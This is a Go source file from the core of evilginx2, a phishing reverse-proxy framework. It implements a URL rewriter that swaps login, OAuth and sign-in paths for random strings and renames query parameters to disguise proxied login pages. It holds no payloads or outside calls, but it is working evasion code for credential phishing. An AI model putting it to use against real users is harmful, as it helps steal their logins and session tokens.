package core

import (
	"fmt"
	"net/url"
	"strings"
	"sync"

	"github.com/kgretzky/evilginx2/log"
)

type RewriteRule struct {
	MatchPath   string
	RewriteTo   string
	StripParams []string
}

type URLRewriter struct {
	enabled    bool
	rules      []RewriteRule
	reverseMap map[string]string
	sync.RWMutex
}

func NewURLRewriter() *URLRewriter {
	rw := &URLRewriter{
		enabled:    false,
		rules:      []RewriteRule{},
		reverseMap: make(map[string]string),
	}

	// default rules
	rw.AddRule("/login", "/r/{random}", nil)
	rw.AddRule("/authorize", "/a/{random}", nil)
	rw.AddRule("/oauth2", "/o/{random}", nil)
	rw.AddRule("/signin", "/s/{random}", nil)

	log.Info("URLRewriter initialized with %d default rules", len(rw.rules))
	return rw
}

func (rw *URLRewriter) SetEnabled(enabled bool) {
	rw.Lock()
	defer rw.Unlock()
	rw.enabled = enabled
	if enabled {
		log.Info("URL rewriting enabled (%d rules active)", len(rw.rules))
	} else {
		log.Info("URL rewriting disabled")
	}
}

func (rw *URLRewriter) IsEnabled() bool {
	rw.RLock()
	defer rw.RUnlock()
	return rw.enabled
}

func (rw *URLRewriter) AddRule(matchPath, rewriteTo string, stripParams []string) {
	rw.Lock()
	defer rw.Unlock()

	finalRewrite := rewriteTo
	if strings.Contains(rewriteTo, "{random}") {
		randStr := GenRandomAlphanumString(6)
		finalRewrite = strings.Replace(rewriteTo, "{random}", randStr, 1)
	}

	if stripParams == nil {
		stripParams = []string{}
	}

	rule := RewriteRule{
		MatchPath:   matchPath,
		RewriteTo:   finalRewrite,
		StripParams: stripParams,
	}

	rw.rules = append(rw.rules, rule)
	rw.reverseMap[finalRewrite] = matchPath

	log.Debug("URL rewrite rule added: %s -> %s (strip: %v)", matchPath, finalRewrite, stripParams)
}

func (rw *URLRewriter) RewriteURL(originalPath string, query string) (string, string) {
	rw.RLock()
	defer rw.RUnlock()

	if !rw.enabled {
		return originalPath, query
	}

	for _, rule := range rw.rules {
		if !strings.HasPrefix(originalPath, rule.MatchPath) {
			continue
		}

		// matched — build new path
		newPath := rule.RewriteTo
		if len(originalPath) > len(rule.MatchPath) {
			suffix := originalPath[len(rule.MatchPath):]
			newPath = newPath + suffix
		}

		// process query params
		newQuery := query
		if len(rule.StripParams) > 0 && query != "" {
			newQuery = rw.obfuscateQueryParams(query, rule.StripParams)
		}

		log.Debug("URL rewritten: %s?%s -> %s?%s", originalPath, query, newPath, newQuery)
		return newPath, newQuery
	}

	return originalPath, query
}

func (rw *URLRewriter) obfuscateQueryParams(query string, stripParams []string) string {
	values, err := url.ParseQuery(query)
	if err != nil {
		return query
	}

	stripSet := make(map[string]bool)
	for _, p := range stripParams {
		stripSet[strings.ToLower(p)] = true
	}

	result := url.Values{}
	for key, vals := range values {
		if stripSet[strings.ToLower(key)] {
			// rename the parameter to a random 2-char key
			newKey := GenRandomAlphanumString(2)
			for _, v := range vals {
				result.Add(newKey, v)
			}
		} else {
			for _, v := range vals {
				result.Add(key, v)
			}
		}
	}

	return result.Encode()
}

func (rw *URLRewriter) RestoreURL(rewrittenPath string) string {
	rw.RLock()
	defer rw.RUnlock()

	// try exact match first
	if original, ok := rw.reverseMap[rewrittenPath]; ok {
		return original
	}

	// try prefix match — the rewritten path may have a suffix beyond the rule's RewriteTo
	for rewritten, original := range rw.reverseMap {
		if strings.HasPrefix(rewrittenPath, rewritten) {
			suffix := rewrittenPath[len(rewritten):]
			return original + suffix
		}
	}

	return rewrittenPath
}

func (rw *URLRewriter) ClearRules() {
	rw.Lock()
	defer rw.Unlock()
	rw.rules = []RewriteRule{}
	rw.reverseMap = make(map[string]string)
	log.Info("URL rewrite rules cleared")
}

func (rw *URLRewriter) GetRules() []RewriteRule {
	rw.RLock()
	defer rw.RUnlock()

	out := make([]RewriteRule, len(rw.rules))
	copy(out, rw.rules)
	return out
}

func (rw *URLRewriter) GetStatus() string {
	rw.RLock()
	defer rw.RUnlock()

	state := "disabled"
	if rw.enabled {
		state = "enabled"
	}

	lines := []string{
		fmt.Sprintf("URL Rewriter: %s (%d rules)", state, len(rw.rules)),
	}

	for i, rule := range rw.rules {
		strip := "none"
		if len(rule.StripParams) > 0 {
			strip = strings.Join(rule.StripParams, ", ")
		}
		lines = append(lines, fmt.Sprintf("  [%d] %s -> %s (strip: %s)", i+1, rule.MatchPath, rule.RewriteTo, strip))
	}

	return strings.Join(lines, "\n")
}
